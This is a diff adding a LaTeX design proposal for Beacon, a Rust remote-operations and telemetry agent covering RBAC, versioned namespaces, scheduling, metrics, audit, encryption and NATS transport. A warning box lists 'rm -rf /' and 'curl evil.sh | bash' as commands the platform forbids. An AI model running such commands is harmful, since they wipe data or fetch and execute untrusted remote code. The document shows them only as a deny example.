@@ -1,0 +1,1420 @@
+\documentclass[12pt,a4paper]{article}
+
+% ─── Packages ────────────────────────────────────────────────────────────────
+\usepackage[T1]{fontenc}
+\usepackage[utf8]{inputenc}
+\usepackage{lmodern}
+\usepackage[margin=1in]{geometry}
+\usepackage{xcolor}
+\usepackage{titlesec}
+\usepackage{titletoc}
+\usepackage{tocloft}
+\usepackage{listings}
+\usepackage{booktabs}
+\usepackage{longtable}
+\usepackage{array}
+\usepackage{tabularx}
+\usepackage{enumitem}
+\usepackage{hyperref}
+\usepackage{fancyhdr}
+\usepackage{graphicx}
+\usepackage{amsmath}
+\usepackage{microtype}
+\usepackage{parskip}
+\usepackage{mdframed}
+\usepackage{fontawesome5}
+\usepackage{multicol}
+\usepackage{float}
+\usepackage{caption}
+
+% ─── Colours ─────────────────────────────────────────────────────────────────
+\definecolor{beaconblue}{HTML}{1A3C5E}
+\definecolor{beaconaccent}{HTML}{2E86AB}
+\definecolor{beacongray}{HTML}{F4F6F8}
+\definecolor{beacondark}{HTML}{0D1F2D}
+\definecolor{warningred}{HTML}{C0392B}
+\definecolor{successgreen}{HTML}{1E8449}
+\definecolor{codebg}{HTML}{F0F4F8}
+\definecolor{codeframe}{HTML}{CBD5E0}
+\definecolor{commentgray}{HTML}{718096}
+
+% ─── Hyperref ────────────────────────────────────────────────────────────────
+\hypersetup{
+    colorlinks=true,
+    linkcolor=beaconaccent,
+    urlcolor=beaconaccent,
+    citecolor=beaconaccent,
+    pdftitle={Beacon -- Distributed Remote Operations Platform},
+    pdfauthor={Beacon Project},
+    pdfsubject={Technical Proposal},
+}
+
+% ─── Section Styling ─────────────────────────────────────────────────────────
+\titleformat{\section}
+  {\Large\bfseries\color{beaconblue}}
+  {\thesection}{1em}{}[\color{beaconaccent}\titlerule]
+
+\titleformat{\subsection}
+  {\large\bfseries\color{beaconblue}}
+  {\thesubsection}{1em}{}
+
+\titleformat{\subsubsection}
+  {\normalsize\bfseries\color{beacondark}}
+  {\thesubsubsection}{1em}{}
+
+\titlespacing*{\section}{0pt}{1.5em}{0.8em}
+\titlespacing*{\subsection}{0pt}{1.2em}{0.5em}
+
+% ─── Headers & Footers ───────────────────────────────────────────────────────
+\pagestyle{fancy}
+\fancyhf{}
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\footrulewidth}{0.4pt}
+\fancyhead[L]{\small\color{beaconblue}\textbf{Beacon} — Technical Proposal}
+\fancyhead[R]{\small\color{commentgray}Confidential}
+\fancyfoot[C]{\small\color{commentgray}\thepage}
+\fancyfoot[R]{\small\color{commentgray}v1.0}
+
+% ─── Listings (code blocks) ──────────────────────────────────────────────────
+\lstset{
+    backgroundcolor=\color{codebg},
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    breakatwhitespace=true,
+    frame=single,
+    rulecolor=\color{codeframe},
+    framesep=4pt,
+    xleftmargin=8pt,
+    xrightmargin=8pt,
+    aboveskip=8pt,
+    belowskip=8pt,
+    tabsize=2,
+    showstringspaces=false,
+    commentstyle=\color{commentgray}\itshape,
+    keywordstyle=\color{beaconaccent}\bfseries,
+    stringstyle=\color{successgreen},
+    numberstyle=\tiny\color{commentgray},
+    captionpos=b,
+}
+
+\lstdefinelanguage{yaml}{
+    keywords={true,false,null,yes,no},
+    keywordstyle=\color{beaconaccent}\bfseries,
+    sensitive=false,
+    comment=[l]{\#},
+    commentstyle=\color{commentgray}\itshape,
+    morestring=[b]",
+    morestring=[b]',
+    stringstyle=\color{successgreen},
+}
+
+\lstdefinelanguage{json}{
+    keywords={true,false,null},
+    keywordstyle=\color{beaconaccent}\bfseries,
+    sensitive=false,
+    morestring=[b]",
+    stringstyle=\color{successgreen},
+}
+
+% ─── Custom Boxes ─────────────────────────────────────────────────────────────
+\newmdenv[
+    backgroundcolor=beacongray,
+    linecolor=beaconaccent,
+    linewidth=2pt,
+    leftline=true,
+    rightline=false,
+    topline=false,
+    bottomline=false,
+    innerleftmargin=12pt,
+    innerrightmargin=8pt,
+    innertopmargin=8pt,
+    innerbottommargin=8pt,
+]{infobox}
+
+\newmdenv[
+    backgroundcolor=warningred!8,
+    linecolor=warningred,
+    linewidth=2pt,
+    leftline=true,
+    rightline=false,
+    topline=false,
+    bottomline=false,
+    innerleftmargin=12pt,
+    innerrightmargin=8pt,
+    innertopmargin=8pt,
+    innerbottommargin=8pt,
+]{warningbox}
+
+\newmdenv[
+    backgroundcolor=successgreen!8,
+    linecolor=successgreen,
+    linewidth=2pt,
+    leftline=true,
+    rightline=false,
+    topline=false,
+    bottomline=false,
+    innerleftmargin=12pt,
+    innerrightmargin=8pt,
+    innertopmargin=8pt,
+    innerbottommargin=8pt,
+]{successbox}
+
+% ─── Table of Contents Styling ───────────────────────────────────────────────
+\renewcommand{\cftsecfont}{\bfseries\color{beaconblue}}
+\renewcommand{\cftsecpagefont}{\bfseries\color{beaconblue}}
+\renewcommand{\cftsubsecfont}{\color{beacondark}}
+
+% ─── Document ─────────────────────────────────────────────────────────────────
+\begin{document}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  TITLE PAGE
+% ═══════════════════════════════════════════════════════════════════════════════
+\begin{titlepage}
+    \pagecolor{beaconblue}
+    \color{white}
+    \centering
+    \vspace*{3cm}
+
+    {\fontsize{56}{60}\selectfont\bfseries BEACON}\\[0.5cm]
+    {\color{beaconaccent}\rule{10cm}{2pt}}\\[0.8cm]
+    {\Large\bfseries Remote Operations, Monitoring,}\\[0.3cm]
+    {\Large\bfseries Automation \& Telemetry agent for Project}\\
+    {\Large\bfseries ATLAS (Autonomous Telemetry, Logging, Analysis, and Surveillance)}\\[2cm]
+
+    {\large Technical Design and Implementation Proposal}\\[0.4cm]
+
+    \begin{tabular}{rl}
+        \textbf{Platform:}    & Linux (x86\_64, ARM, Raspberry Pi) \\[0.3em]
+        \textbf{Language:}    & Rust (async-first, Tokio runtime) \\[0.3em]
+        \textbf{Transport:}   & NATS + JetStream \\[0.3em]
+        \textbf{Storage:}     & SQLite (Agent) \quad PostgreSQL (Server) \\[0.3em]
+        \textbf{Interface:}   & TUI(Terminal User Interface) (Ratatui) · REST API · WebSocket \\[0.3em]
+        \textbf{Security:}    & RBAC · Argon2id · AES-256-GCM · TLS 1.3 \\
+    \end{tabular}
+
+    \vfill
+\end{titlepage}
+\nopagecolor
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  TABLE OF CONTENTS
+% ═══════════════════════════════════════════════════════════════════════════════
+\newpage
+\tableofcontents
+\newpage
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  1. EXECUTIVE SUMMARY
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Executive Summary}
+
+Beacon is a \textbf{production-grade, distributed Linux operations and aobeservability enable agent } written entirely in Rust. It enables administrators to manage fleets of Linux systems remotely through approved automation workflows, real-time telemetry collection, secure execution engines, immutable audit trails, and offline-capable local operation.
+
+It is an \textbf{operations platform} — comparable in architecture to components found in systems such as Salt, Ansible, Rundeck, Zabbix, Prometheus, and osquery — while remaining purpose-built, Rust-native, and deployable on hardware as constrained as a Raspberry Pi.
+
+\begin{infobox}
+\textbf{Key Design Principles}
+\begin{itemize}[noitemsep]
+    \item No arbitrary shell execution — all operations are approved and versioned
+    \item Offline-first: agents continue collecting, logging, auditing, and queuing without connectivity
+    \item RBAC enforced at every boundary: CLI, TUI, REST, WebSocket, Scheduler, Database
+    \item Immutable audit trails — not even Captain can delete audit records
+    \item Encryption at rest (AES-256-GCM) and in transit (TLS 1.3)
+    \item Single agent scales from Raspberry Pi to large fleet
+\end{itemize}
+\end{infobox}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  2. SYSTEM ARCHITECTURE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{System Architecture}
+
+\subsection{Binary Topology}
+
+Beacon ships as two separate binaries:
+
+\begin{center}
+\begin{tabularx}{0.85\textwidth}{>{\bfseries}lX}
+\toprule
+Binary & Description \\
+\midrule
+\texttt{beacon-server} & Central management server. Manages authentication, RBAC, namespace definitions, group orchestration, metrics aggregation, scheduling, audit storage, and the NATS gateway. \\[0.5em]
+\texttt{beacon-agent}  & Installed on every managed Linux machine. Executes operations locally, collects telemetry, maintains local SQLite databases, buffers data offline, and communicates with the server exclusively via NATS. \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+A single Beacon Server is designed to manage 1 to 1\,000+ agents without architectural changes.
+
+\subsection{High-Level Communication Flow}
+
+\begin{lstlisting}[language=bash, caption={System Data Flow}]
+Users
+  |
+  v
+Beacon Server
+  +-- Authentication & RBAC
+  +-- Audit System
+  +-- Namespace Manager
+  +-- Group Manager
+  +-- Metrics Manager
+  +-- API Server (REST + WebSocket)
+  +-- NATS Client
+  |
+  v
+NATS + JetStream (Transport Layer)
+  +-- Commands
+  +-- Metrics
+  +-- Logs
+  +-- Events / Audit Events
+  +-- Heartbeats
+  |
+  v
+Beacon Agents (1 ... N)
+\end{lstlisting}
+
+\subsection{Agent Engine Architecture}
+
+Every agent is composed of independent, purpose-scoped engines:
+
+\begin{multicols}{2}
+\begin{itemize}[noitemsep,leftmargin=*]
+    \item Identity Engine
+    \item Authentication Engine
+    \item Authorization Engine
+    \item Configuration Engine
+    \item Namespace Engine
+    \item Execution Engine
+    \item Scheduler Engine
+    \item Metrics Engine
+    \item Logging Engine
+    \item Audit Engine
+    \item Encryption Engine
+    \item Queue Engine
+    \item Storage Engine
+    \item API Engine
+    \item WebSocket Engine
+    \item Service Engine
+    \item Health Engine
+    \item Recovery Engine
+    \item Plugin Engine
+\end{itemize}
+\end{multicols}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  3. CORE DESIGN PRINCIPLES
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Core Design Principles}
+
+\subsection{The Approved Operations Model}
+
+Beacon is \textbf{not} a shell wrapper. Arbitrary shell execution is strictly forbidden at every layer.
+
+\begin{warningbox}
+\textbf{Forbidden Operations — Will Never Be Supported}
+\begin{lstlisting}[language=bash]
+beacon exec "rm -rf /"
+beacon exec "curl evil.sh | bash"
+beacon namespace add-command "user supplied shell"
+\end{lstlisting}
+\end{warningbox}
+
+All execution occurs through \textbf{approved, versioned operations} contained within namespaces:
+
+\begin{lstlisting}[language=json, caption={Example namespace operation definition}]
+{
+  "namespace": "update_system",
+  "operations": [
+    { "type": "update_packages" },
+    { "type": "upgrade_packages" },
+    { "type": "autoremove_packages" }
+  ]
+}
+\end{lstlisting}
+
+\subsection{Supported Operation Categories}
+
+\begin{multicols}{2}
+\begin{itemize}[noitemsep,leftmargin=*]
+    \item Package Operations
+    \item Service Operations
+    \item File Operations
+    \item Directory Operations
+    \item User Operations
+    \item Group Operations
+    \item Backup Operations
+    \item Network Operations
+    \item Container Operations
+    \item System Operations
+    \item Custom Plugin Operations
+\end{itemize}
+\end{multicols}
+
+Every operation definition must include:
+
+\begin{center}
+\begin{tabularx}{0.75\textwidth}{lX}
+\toprule
+Field & Purpose \\
+\midrule
+\texttt{operation\_id}  & Unique stable identifier \\
+\texttt{version}        & Immutable version reference \\
+\texttt{inputs}         & Declared input parameters \\
+\texttt{outputs}        & Declared output schema \\
+\texttt{timeout}        & Maximum allowed runtime \\
+\texttt{required\_role} & Minimum RBAC role to execute \\
+\texttt{audit\_policy}  & What to record and retain \\
+\texttt{rollback\_policy} & How to reverse the operation \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  4. IDENTITY ENGINE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Identity Engine}
+
+Each agent generates a unique, stable \texttt{app\_id} (agent identity) derived from hardware and environment characteristics:
+
+\begin{itemize}[noitemsep]
+    \item Machine ID (\texttt{/etc/machine-id})
+    \item Hostname
+    \item CPU serial number
+    \item RAM configuration
+    \item Motherboard UUID
+    \item First boot timestamp
+    \item Random 256-bit salt
+\end{itemize}
+
+These inputs are combined and hashed using \textbf{SHA-256}. The result is stored permanently. \textbf{Only a Captain role may trigger regeneration}. All generated data carries:
+
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+Field & Description \\
+\midrule
+\texttt{app\_id} & Stable agent identity \\
+\texttt{timestamp} & Generation time \\
+\texttt{sequence\_number} & Monotonic counter \\
+\texttt{schema\_version} & Data schema version \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+On first startup the agent registers itself with the server via NATS, transmitting: \texttt{agent\_id}, \texttt{hostname}, \texttt{os}, \texttt{architecture}, \texttt{version}, \texttt{last\_seen}, \texttt{status}, and \texttt{tags}.
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  5. AUTHENTICATION & AUTHORIZATION
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Authentication \& Authorization}
+
+\subsection{Roles}
+
+Beacon implements a three-tier RBAC model:
+
+\begin{center}
+\begin{tabularx}{\textwidth}{lX}
+\toprule
+Role & Capabilities \\
+\midrule
+\textbf{Viewer} &
+  View metrics, logs, namespaces, groups, agents, executions, audit history.
+  Export logs and metrics. No write or execute access. \\[0.5em]
+\textbf{Commander} &
+  Everything Viewer can do, plus: execute namespaces and groups, pause/resume/stop
+  executions. Cannot create, edit, or delete resources. Cannot manage users or
+  configuration. \\[0.5em]
+\textbf{Captain} &
+  Full administrative control. User CRUD, namespace and group CRUD, scheduling,
+  password management, database operations, backup management, configuration changes,
+  encryption management, metrics configuration, agent management, audit management. \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+\subsection{Password Storage}
+
+All passwords are stored using \textbf{Argon2id}. Plaintext storage is prohibited at every layer.
+
+\subsection{Password Recovery}
+
+\begin{itemize}[noitemsep]
+    \item \textbf{Primary recovery}: Recovery Key generated at initialization (format: \texttt{AB2F-D921-882C-771F}; regex: \texttt{\textasciicircum{}[A-F0-9]\{4\}-[A-F0-9]\{4\}-[A-F0-9]\{4\}-[A-F0-9]\{3\}\$}). The user must save this key securely.
+    \item \textbf{Optional secondary}: Security question \textit{What is your favourite food?} (configured post-initialization, used only as a secondary factor).
+\end{itemize}
+
+All password resets are recorded in the immutable audit log.
+
+\subsection{RBAC Enforcement Scope}
+
+RBAC is enforced at \textbf{every boundary} — UI restrictions alone are not acceptable:
+
+\begin{multicols}{2}
+\begin{itemize}[noitemsep,leftmargin=*]
+    \item CLI
+    \item TUI
+    \item REST API
+    \item WebSocket API
+    \item Scheduler
+    \item Execution Engine
+    \item Database Actions
+    \item Configuration Actions
+    \item NATS Publishing
+    \item Administrative Operations
+\end{itemize}
+\end{multicols}
+
+\subsection{Namespace-Level RBAC}
+
+Each namespace carries its own minimum role requirement:
+
+\begin{lstlisting}[language=yaml, caption={Namespace RBAC configuration}]
+restart_nginx:
+  required_role: commander
+
+create_admin_user:
+  required_role: captain
+
+read_disk_usage:
+  required_role: viewer
+\end{lstlisting}
+
+Commanders cannot execute namespaces requiring a role above their own. The server validates this server-side on every request.
+
+\subsection{Authentication Token Model}
+
+\begin{itemize}[noitemsep]
+    \item Username/password login produces a short-lived \textbf{JWT access token}
+    \item A \textbf{refresh token} enables session renewal without re-authentication
+    \item Session expiration is enforced; all login events are logged
+\end{itemize}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  6. NAMESPACE SYSTEM
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Namespace System}
+
+\subsection{Definition}
+
+A \textbf{namespace} is a reusable, versioned automation workflow consisting of one or more approved operations executed in sequence.
+
+\subsection{Versioning}
+
+Every namespace is \textbf{immutable} once published. Updates create a new version:
+
+\begin{lstlisting}[language=bash]
+update_system_v1   # Original
+update_system_v2   # Added autoremove step
+update_system_v3   # Added reboot check
+\end{lstlisting}
+
+Execution references a specific version. Running executions never switch versions mid-flight.
+
+\subsection{Namespace Groups}
+
+Namespaces can be composed into ordered groups:
+
+\begin{lstlisting}[language=bash, caption={Example: Server Provisioning Group}]
+provision_server:
+  1. install_packages
+  2. configure_firewall
+  3. create_users
+  4. start_services
+\end{lstlisting}
+
+Groups support ordered execution, reordering, individual namespace enable/disable, and group-level execution history.
+
+\subsection{Agent Tags}
+
+Agents can be tagged and namespaces executed against tag sets:
+
+\begin{lstlisting}[language=bash]
+beacon namespace run update_system --tag production
+beacon namespace run audit_logs    --tag database
+beacon group run provision_server  --tag staging
+\end{lstlisting}
+
+Supported built-in tags: \texttt{production}, \texttt{staging}, \texttt{testing}, \texttt{database}, \texttt{web}, \texttt{edge}, \texttt{raspberrypi}.
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  7. EXECUTION ENGINE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Execution Engine}
+
+\subsection{Execution Record}
+
+Every execution is assigned a full identity record:
+
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+Field & Description \\
+\midrule
+\texttt{execution\_id} & Unique execution identifier \\
+\texttt{namespace\_version} & Pinned version at time of launch \\
+\texttt{initiator} & Authenticated user / scheduler \\
+\texttt{timestamp} & UTC start time \\
+\texttt{status} & Current state \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\subsection{Execution States}
+
+\begin{multicols}{2}
+\begin{itemize}[noitemsep,leftmargin=*]
+    \item \texttt{Pending}
+    \item \texttt{Queued}
+    \item \texttt{Running}
+    \item \texttt{Paused}
+    \item \texttt{Completed}
+    \item \texttt{Failed}
+    \item \texttt{Cancelled}
+    \item \texttt{TimedOut}
+\end{itemize}
+\end{multicols}
+
+\subsection{Execution Lock Manager}
+
+Per-namespace lock modes prevent execution collisions:
+
+\begin{lstlisting}[language=yaml, caption={Lock mode configuration}]
+update_system:
+  lock_mode: deny      # Reject concurrent runs entirely
+
+deploy_service:
+  lock_mode: queue     # Queue additional requests
+
+restart_nginx:
+  lock_mode: replace   # Cancel queued, run new
+
+collect_stats:
+  lock_mode: parallel  # Allow simultaneous runs
+\end{lstlisting}
+
+\subsection{Resource Controls}
+
+\begin{lstlisting}[language=yaml, caption={Global resource limits}]
+max_parallel_executions: 10
+max_queue_size: 10000
+max_ws_clients: 100
+max_log_rate: 1000/sec
+max_metric_rate: 1000/sec
+\end{lstlisting}
+
+Requests exceeding these limits are rejected with appropriate error responses.
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  8. SCHEDULER ENGINE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Scheduler Engine}
+
+\subsection{Schedule Types}
+
+\begin{multicols}{2}
+\begin{itemize}[noitemsep,leftmargin=*]
+    \item Every Minute
+    \item Every Hour
+    \item Every Day
+    \item Every Week
+    \item Every Month
+    \item On Boot
+    \item Cron Expression
+\end{itemize}
+\end{multicols}
+
+\subsection{Execution Policies}
+
+When a schedule fires while a prior execution is still active:
+
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+Policy & Behaviour \\
+\midrule
+\texttt{Skip}     & Do not start a new execution \\
+\texttt{Queue}    & Enqueue behind running execution \\
+\texttt{Replace}  & Cancel queued, start new \\
+\texttt{Parallel} & Allow concurrent execution \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\subsection{Missed Schedule Handling}
+
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+Policy & Behaviour \\
+\midrule
+\texttt{ExecuteImmediately} & Run as soon as agent is available \\
+\texttt{Ignore}             & Silently skip the missed window \\
+\texttt{Queue}              & Enqueue the missed execution \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\subsection{Maintenance Windows}
+
+\begin{lstlisting}[language=bash]
+beacon maintenance enable production   # Suppress dangerous ops
+beacon maintenance disable production  # Resume normal scheduling
+\end{lstlisting}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  9. METRICS ENGINE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Metrics Engine}
+
+\subsection{Collectors}
+
+\begin{center}
+\begin{tabularx}{\textwidth}{lX}
+\toprule
+Collector & Metrics \\
+\midrule
+\textbf{CPU} & Usage, per-core usage, frequency, temperature, context switches, interrupts, load average \\
+\textbf{RAM} & Total, used, free, cached, buffers, swap \\
+\textbf{Storage} & Capacity, usage, IOPS, throughput, latency \\
+\textbf{Network} & RX/TX bytes, errors, connections, interface status \\
+\textbf{Processes} & PID, name, user, CPU\%, memory\%, start time \\
+\textbf{Mounted Drives} & Filesystem, mount path, capacity, usage \\
+\textbf{Kernel} & Kernel version, distribution, uptime, hostname, architecture \\
+\textbf{Services} & Status, restart count, last changed \\
+\textbf{Temperature} & Per-sensor readings \\
+\textbf{Power} & Battery state, AC/DC status \\
+\textbf{Containers} & Container ID, name, CPU/RAM usage, status \\
+\textbf{Kubernetes Logs} & Timestamp, namespace, pod, container, node, stream (stdout/stderr), log message \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+\subsection{Collector Health Tracking}
+
+Each collector independently tracks:
+
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+Field & Type \\
+\midrule
+\texttt{last\_run} & Timestamp \\
+\texttt{last\_success} & Timestamp \\
+\texttt{last\_failure} & Timestamp \\
+\texttt{failure\_count} & Counter \\
+\texttt{status} & \texttt{Healthy | Degraded | Failed | Disabled} \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\subsection{Data Retention}
+
+\begin{center}
+\begin{tabular}{lll}
+\toprule
+Resolution & Interval & Retention \\
+\midrule
+Raw        & 1 second  & 24 hours \\
+Rollup     & 1 minute  & 30 days \\
+Rollup     & 1 hour    & 365 days \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+Automatic pruning is applied to all tiers. Process identity uses the triple \texttt{(pid, boot\_id, start\_time)} to avoid PID reuse ambiguity.
+
+\subsection{Metrics Configuration}
+
+\begin{lstlisting}[language=bash, caption={Metrics management commands}]
+beacon cpu enable / disable
+beacon ram enable / disable
+beacon storage enable / disable
+beacon network enable / disable
+beacon process enable / disable
+beacon drives enable / disable
+beacon system enable / disable
+
+beacon metrics enable-all
+beacon metrics disable-all
+beacon metrics interval 1s
+beacon metrics interval 5s
+beacon metrics interval 30s
+beacon metrics interval 1m
+beacon metrics retention 30d
+\end{lstlisting}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  10. LOGGING ENGINE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Logging Engine}
+
+Every event generates a structured log entry:
+
+\begin{lstlisting}[language=json, caption={Log entry schema}]
+{
+  "timestamp":    "2024-01-15T14:23:01.123Z",
+  "app_id":       "sha256:a3f1...",
+  "execution_id": "exec-00421",
+  "namespace":    "update_system",
+  "severity":     "Info",
+  "source":       "execution_engine",
+  "message":      "Package upgrade completed successfully"
+}
+\end{lstlisting}
+
+\subsection{Severity Levels}
+
+\begin{multicols}{2}
+\begin{itemize}[noitemsep,leftmargin=*]
+    \item \texttt{Trace}
+    \item \texttt{Debug}
+    \item \texttt{Info}
+    \item \texttt{Warning}
+    \item \texttt{Error}
+    \item \texttt{Critical}
+\end{itemize}
+\end{multicols}
+
+Severity is \textbf{never inferred from stdout}. It must be explicitly assigned by the producing subsystem.
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  11. IMMUTABLE AUDIT ENGINE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Immutable Audit Engine}
+
+\begin{warningbox}
+\textbf{Audit records cannot be deleted or modified — not even by the Captain role.}
+\end{warningbox}
+
+\subsection{Audited Events}
+
+\begin{multicols}{2}
+\begin{itemize}[noitemsep,leftmargin=*]
+    \item Login / Logout
+    \item Namespace execution
+    \item Password resets
+    \item User creation / deletion
+    \item Agent removal
+    \item Configuration changes
+    \item Encryption key rotation
+    \item RBAC changes
+    \item All failed actions
+    \item All unauthorized attempts
+\end{itemize}
+\end{multicols}
+
+\subsection{Permitted Audit Operations}
+
+\begin{successbox}
+\textbf{Allowed:} Archive, Export, Compress, Verify \\
+\textbf{Forbidden:} Delete, Modify, Rewrite
+\end{successbox}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  12. STORAGE ENGINE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Storage Engine}
+
+\subsection{Agent Storage (SQLite)}
+
+The agent uses five dedicated SQLite databases to avoid lock contention:
+
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+Database & Contents \\
+\midrule
+\texttt{config.db}  & Agent configuration, namespace definitions \\
+\texttt{metrics.db} & Metric time-series data, rollups \\
+\texttt{logs.db}    & Structured event logs \\
+\texttt{audit.db}   & Immutable audit records \\
+\texttt{queue.db}   & Outbound message queue \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+All databases operate with WAL mode, periodic VACUUM, integrity checks, and scheduled backups.
+
+\subsection{Server Storage (PostgreSQL)}
+
+The server uses PostgreSQL for all persistent state:
+
+\begin{multicols}{2}
+\begin{itemize}[noitemsep,leftmargin=*]
+    \item Users \& Roles
+    \item Agents \& Tags
+    \item Namespace Definitions
+    \item Groups
+    \item Metrics History
+    \item Audit Events
+    \item Log Aggregates
+    \item Schedules
+    \item Configurations
+    \item Execution History
+\end{itemize}
+\end{multicols}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  13. QUEUE ENGINE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Queue Engine}
+
+\subsection{Message States}
+
+All outbound data passes through the queue:
+
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+State & Description \\
+\midrule
+\texttt{Pending}    & Awaiting dispatch \\
+\texttt{Processing} & Actively being sent \\
+\texttt{Sent}       & Successfully delivered \\
+\texttt{Failed}     & Delivery attempt failed \\
+\texttt{DeadLetter} & Exhausted max retry attempts \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+After \texttt{max\_retries: 5} failures, messages enter the Dead Letter Queue for manual inspection and optional replay.
+
+\subsection{Offline Buffering}
+
+During network loss the agent continues all local operations without interruption:
+
+\begin{itemize}[noitemsep]
+    \item Continue collecting metrics
+    \item Continue logging events
+    \item Continue auditing actions
+    \item Continue queueing outbound data
+\end{itemize}
+
+On connectivity restoration, all queued data replays automatically in order.
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  14. ENCRYPTION ENGINE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Encryption Engine}
+
+\subsection{Encryption Scheme}
+
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+Layer & Algorithm \\
+\midrule
+Transport                & TLS 1.3 \\
+Payload (optional)       & AES-256-GCM \\
+Key Derivation           & Argon2id from master password \\
+Log Encryption (optional)& AES-256-GCM \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\subsection{Encrypted Data}
+
+\begin{itemize}[noitemsep]
+    \item Queued outbound payloads
+    \item Stored credentials
+    \item Sensitive configuration values
+    \item Optionally: full log storage
+\end{itemize}
+
+\subsection{Key Rotation}
+
+Key rotation is an atomic operation with rollback support:
+
+\begin{lstlisting}[language=bash, caption={Key rotation process}]
+1. Generate new AES-256-GCM key
+2. Decrypt all existing data with current key
+3. Re-encrypt with new key
+4. Verify all data integrity
+5. Commit rotation
+   (Rollback supported at any step)
+\end{lstlisting}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  15. TRANSPORT: NATS + JETSTREAM
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Transport: NATS + JetStream}
+
+\subsection{Why NATS?}
+
+NATS JetStream provides out-of-the-box:
+
+\begin{multicols}{2}
+\begin{itemize}[noitemsep,leftmargin=*]
+    \item Durable messaging
+    \item Replay semantics
+    \item Acknowledgements
+    \item Consumer groups
+    \item Message persistence
+    \item Retry handling
+    \item Stream retention policies
+    \item Dead-letter queues
+\end{itemize}
+\end{multicols}
+
+There is no need to implement custom queueing for inter-component communication.
+
+\subsection{Subject Naming Convention}
+
+\begin{lstlisting}[language=bash, caption={NATS subject hierarchy}]
+beacon.agent.<agent_id>.commands
+beacon.agent.<agent_id>.logs
+beacon.agent.<agent_id>.metrics
+beacon.agent.<agent_id>.audit
+beacon.agent.<agent_id>.heartbeat
+
+beacon.group.<tag>.commands       # Tag-based targeting
+beacon.all.commands               # Broadcast to all agents
+\end{lstlisting}
+
+\subsection{NATS Security / ACLs}
+
+NATS is transport only. RBAC lives entirely inside Beacon Server. Agents make no authorization decisions.
+
+Example ACL for a single agent:
+
+\begin{lstlisting}[language=yaml, caption={Agent001 NATS ACL}]
+Agent001:
+  publish:
+    - beacon.agent.agent001.logs
+    - beacon.agent.agent001.metrics
+    - beacon.agent.agent001.audit
+    - beacon.agent.agent001.heartbeat
+  subscribe:
+    - beacon.agent.agent001.commands
+  # No other subjects permitted
+\end{lstlisting}
+
+Least privilege is applied to every agent identity.
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  16. REST API
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{REST API}
+
+All REST endpoints are RBAC-protected. Everything available locally must be available remotely.
+
+\subsection{Agent API Endpoints}
+
+\begin{lstlisting}[language=bash]
+/auth         /users        /namespaces
+/executions   /logs         /metrics
+/audit        /config       /queue
+/system
+\end{lstlisting}
+
+\subsection{Server API Endpoints}
+
+\begin{lstlisting}[language=bash]
+/api/v1/auth         /api/v1/users
+/api/v1/agents       /api/v1/namespaces
+/api/v1/groups       /api/v1/executions
+/api/v1/logs         /api/v1/metrics
+/api/v1/audit        /api/v1/config
+/api/v1/backups
+\end{lstlisting}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  17. WEBSOCKET ENGINE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{WebSocket Engine}
+
+Clients subscribe to specific channels rather than receiving a global broadcast:
+
+\begin{lstlisting}[language=json, caption={WebSocket subscription example}]
+{
+  "channel":   "logs",
+  "namespace": "update_system",
+  "agent_id":  "agent001"
+}
+\end{lstlisting}
+
+\subsection{Available Channels}
+
+\begin{multicols}{2}
+\begin{itemize}[noitemsep,leftmargin=*]
+    \item \texttt{logs}
+    \item \texttt{metrics}
+    \item \texttt{executions}
+    \item \texttt{audit}
+    \item \texttt{health}
